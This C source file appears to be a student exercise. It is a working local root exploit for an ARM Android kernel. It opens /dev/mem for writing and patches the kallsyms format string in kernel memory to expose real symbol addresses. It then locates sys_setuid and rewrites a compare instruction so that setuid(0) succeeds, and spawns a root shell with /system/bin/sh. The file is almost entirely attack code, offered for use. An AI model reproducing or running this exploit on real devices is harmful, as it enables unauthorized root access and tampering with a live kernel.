#include<stdio.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<string.h>
#include<sys/ioctl.h>
#include<sys/types.h>
#include<errno.h>
#include<stdbool.h>
#include<unistd.h>

#define PAGE_OFFSET 0xc0000000
#define KERNEL_ADDR 0x40000000 
extern int errno;
int main(void)
{
	int dev_fd;
	int result;
	int len;
	int i,u;
	int count =0;
	FILE* kallsyms;
	unsigned long* hw3_map = NULL;
	unsigned long* tmp_addr = NULL;
	bool found = false;
	dev_fd = open("/dev/mem",O_RDWR);
	if(dev_fd == -1) {  // get file descripter of dev/mem
	printf( "dev/mem is not opened\0");
	return 0;
	}
	// page*page is the length of my mmap
	int page_size = sysconf(_SC_PAGE_SIZE);
	len = page_size * page_size;
	// where is the kernel in physical memory???????
	if( (hw3_map = (unsigned long*)mmap(NULL,len,PROT_READ | PROT_WRITE,MAP_SHARED,dev_fd,KERNEL_ADDR))==MAP_FAILED){
	printf("mmap failed\n");
	return 0;
	}		
	
	tmp_addr = hw3_map;
	//printf("hw3_map : %d len : %d \n",hw3_map,len);

	for( i=0; i<len; i+=4){	// len is in byte but tmp is increasing with unsigned long size so i have to be increased by 4 byte rate	
	if(*(unsigned long *)tmp_addr == 0x204b7025 && *(unsigned long *)(tmp_addr+1) ==0x25206325 && *(unsigned long *)(tmp_addr+2) == 0x00000a73) { //why here is 00000a ?? %s is 2573....
	printf("find.. change.. \n");
	*tmp_addr = 0x20207025;
	break;
	
	}
	tmp_addr++;
	}


	
	printf("goto kallsyms file \n");
	
	if((kallsyms = fopen("/proc/kallsyms","r")) ==-1)
	{printf("kallsyms open error"); return 0;}
	printf(" kallsyms fd : %d\n",kallsyms);

	char line[512];
	char *ptr;
	char *str;
	int index =0;
	unsigned long addr_sym;
	while((ptr = fgets(line,512,kallsyms))){ //why 512 is line..? because fgets is stop before newline symbol!!!!
	str = strtok(ptr, " ");
	addr_sym = strtoul(str,NULL,16); //in here strtoul cut the string when it can be expressed as 16 byte. so in this case i cut the address value of kallsyms line.
	index = 1;
//	printf("let's start cutting \n",addr_sym,str); 
	while(str) {
	str = strtok(NULL," ");
	index++; // in kallsyms line , one line is divided by 2 " " value so first is 1 and second and last part is 3..
	if(index == 3)	{
	 if(strncmp("sys_setuid\n", str,10) ==0) found = true;
	 break;
	}
		
	}
	

	if(found)
	{
	tmp_addr = hw3_map; // when kallsyms address is offset from mem base address .. 0x400000000
	//printf("addr_sym = %x tmp_addr = %x \n",addr_sym,tmp_addr);
	tmp_addr +=(addr_sym - PAGE_OFFSET) >>2; // think about it
	printf("what is symbol?? = %x \n" , addr_sym);

	for (i=0;i<128;i+=4){ // think about 128.. why?	
	if(*(unsigned long *)tmp_addr == 0xe3500000){
	*(unsigned long *)tmp_addr = 0xe3500001;
	printf("patching cmd is okok .... %x \n",tmp_addr);
	break;
	}
	tmp_addr++;
	}
	
	break;
	}
	}
/*
	printf("%x \n",*(unsigned long *)tmp_addr);
	tmp_addr++;
	}
	break;
	}}
*/
	printf("setuid gogo \n");
	result = setuid(0);
	printf("setuid ok... %d \n",result);
	system("/system/bin/sh");
	/*char *cmd[2];
	char **env;
	env[0] = NULL;
	cmd[0] = "/system/bin/sh";
	cmd[1] = NULL;
	execve(cmd[0],cmd,env);
	// found function has to be somewhere else....
	
	//fopen and open's difference

	
	while(1){
	printf("%c" ,*hw3_map); 
	if(*hw3_map == '%')
	result = strncmp(hw3_map,"%pK",3);
	if(result == 0){
	printf("find it!!\n");
	return 1;
	}
	hw3_map++;
	}
	*/
	

}

